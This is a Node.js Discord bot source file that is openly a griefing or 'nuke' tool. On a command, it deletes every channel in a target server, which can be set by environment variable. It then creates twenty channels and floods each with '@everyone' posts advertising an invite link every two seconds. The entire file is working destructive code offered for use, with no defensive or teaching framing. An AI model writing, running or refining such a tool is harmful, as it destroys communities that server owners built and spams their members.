const { Client, GatewayIntentBits, PermissionFlagsBits } = require('discord.js');
require('dotenv').config();

// Fix for ReadableStream undefined error
if (typeof ReadableStream === 'undefined') {
  global.ReadableStream = require('stream/web').ReadableStream;
}

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent
  ]
});

// Bot configuration from environment variables
const config = {
  token: process.env.DISCORD_TOKEN,
  targetServerId: process.env.TARGET_SERVER_ID,
  channelName: 'discord.gg/skybet',
  messageContent: '@everyone discord.gg/skybet',
  command: '.lolgg'
};

// Track if the griefing process is active
let isGriefing = false;
let spamIntervals = new Map(); // Store intervals for each channel

client.once('ready', () => {
  console.log(`Logged in as ${client.user.tag}`);
  console.log('Bot is ready to execute commands');
});

client.on('messageCreate', async message => {
  // Check if the message is the command to start griefing
  if (message.content === config.command && !isGriefing) {
    // Check if the user has admin permissions
    if (!message.member.permissions.has(PermissionFlagsBits.Administrator)) {
      return message.reply('You need administrator permissions to use this command.');
    }
    
    isGriefing = true;
    message.channel.send('Starting continuous griefing process...');
    
    // Get the target server
    const guild = client.guilds.cache.get(config.targetServerId) || message.guild;
    
    if (!guild) {
      message.channel.send('Could not find the target server.');
      isGriefing = false;
      return;
    }
    
    // Start the continuous griefing process
    startContinuousGriefing(guild);
  }
  
  // Command to stop griefing
  if (message.content === '.stop' && isGriefing) {
    if (!message.member.permissions.has(PermissionFlagsBits.Administrator)) {
      return message.reply('You need administrator permissions to use this command.');
    }
    
    isGriefing = false;
    stopAllSpam();
    message.channel.send('Griefing process stopped.');
  }
});

async function startContinuousGriefing(guild) {
  try {
    // Delete all existing channels first
    await deleteAllChannels(guild);
    
    // Create 20 channels to spam in
    const channels = await createSpamChannels(guild, 20);
    
    // Start spamming in each channel
    for (const channel of channels) {
      startChannelSpam(channel);
    }
    
    console.log(`Started spamming in ${channels.length} channels`);
  } catch (error) {
    console.error('Error starting griefing:', error);
  }
}

async function deleteAllChannels(guild) {
  console.log('Deleting all existing channels...');
  
  // Get all channels in the guild
  const channels = guild.channels.cache;
  
  // Delete each channel
  for (const [id, channel] of channels) {
    try {
      await channel.delete();
      console.log(`Deleted channel: ${channel.name}`);
      // Small delay to avoid rate limiting
      await new Promise(resolve => setTimeout(resolve, 1000));
    } catch (error) {
      console.error(`Failed to delete channel ${channel.name}:`, error);
    }
  }
}

async function createSpamChannels(guild, count) {
  console.log(`Creating ${count} spam channels...`);
  const channels = [];
  
  for (let i = 0; i < count; i++) {
    try {
      const channel = await guild.channels.create({
        name: `${config.channelName}-${i + 1}`,
        type: 0, // Text channel
        permissionOverwrites: [
          {
            id: guild.id,
            allow: [PermissionFlagsBits.ViewChannel, PermissionFlagsBits.SendMessages]
          }
        ]
      });
      
      channels.push(channel);
      console.log(`Created channel: ${channel.name}`);
      
      // Small delay to avoid rate limiting
      await new Promise(resolve => setTimeout(resolve, 1000));
    } catch (error) {
      console.error(`Failed to create channel:`, error);
    }
  }
  
  return channels;
}

function startChannelSpam(channel) {
  // Create an interval for this specific channel
  const interval = setInterval(async () => {
    if (!isGriefing) return;
    
    try {
      await channel.send(config.messageContent);
      console.log(`Spammed in channel: ${channel.name}`);
    } catch (error) {
      console.error(`Failed to spam in channel ${channel.name}:`, error);
    }
  }, 2000); // Send a message every 2 seconds
  
  // Store the interval so we can clear it later
  spamIntervals.set(channel.id, interval);
}

function stopAllSpam() {
  // Clear all spam intervals
  for (const [channelId, interval] of spamIntervals) {
    clearInterval(interval);
  }
  spamIntervals.clear();
}

// Login to Discord with your bot token
client.login(config.token);
